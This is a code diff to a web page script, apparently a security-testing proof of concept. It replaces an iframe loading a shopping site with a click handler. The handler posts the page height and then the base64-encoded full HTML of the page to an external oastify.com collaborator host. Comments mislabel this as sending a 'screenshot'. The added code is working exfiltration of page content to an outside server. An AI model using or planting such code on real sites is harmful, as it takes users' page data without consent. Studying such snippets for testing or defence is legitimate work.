@@ -14,26 +14,57 @@
 
         // Attach a click event listener to the button
         button.addEventListener('click', function() {
+            // Get the height of the entire webpage
+            var pageHeight = Math.max(
+                document.body.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.clientHeight,
+                document.documentElement.scrollHeight,
+                document.documentElement.offsetHeight
+            );
+
             // Create a new XMLHttpRequest object
             var xhr = new XMLHttpRequest();
 
-            // Define the URL to send the text
+            // Define the URL to send the screenshot
             var url = 'https://xyzhudzjlsjif311zcaevrn2jtpkdb10.oastify.com';
-
-            // Define the text to send
-            var textToSend = 'Hello, I got iframe';
 
             // Set up the request
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Content-Type', 'text/plain');
 
-            // Send the text
-            xhr.send(textToSend);
+            // Send the screenshot when the request is successful
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    captureScreenshot();
+                }
+            };
 
-            // Create and append the iframe
-            var iframe = document.createElement('iframe');
-            iframe.src = 'https://app.codashop.com';
-            document.body.appendChild(iframe);
+            // Send the page height
+            xhr.send(pageHeight.toString());
+
+            // Function to capture the screenshot
+            function captureScreenshot() {
+                // Create a new XMLHttpRequest object
+                var screenshotXhr = new XMLHttpRequest();
+
+                // Define the URL to send the screenshot data
+                var screenshotUrl = 'https://xyzhudzjlsjif311zcaevrn2jtpkdb10.oastify.com';
+
+                // Set up the request
+                screenshotXhr.open('POST', screenshotUrl, true);
+                screenshotXhr.setRequestHeader('Content-Type', 'text/plain');
+
+                // Take the screenshot and send it
+                screenshotXhr.onload = function() {
+                    if (screenshotXhr.status === 200) {
+                        console.log('Screenshot sent successfully!');
+                    }
+                };
+
+                // Capture the screenshot
+                screenshotXhr.send(window.btoa(unescape(encodeURIComponent(document.documentElement.outerHTML))));
+            }
         });
     </script>
 </body>
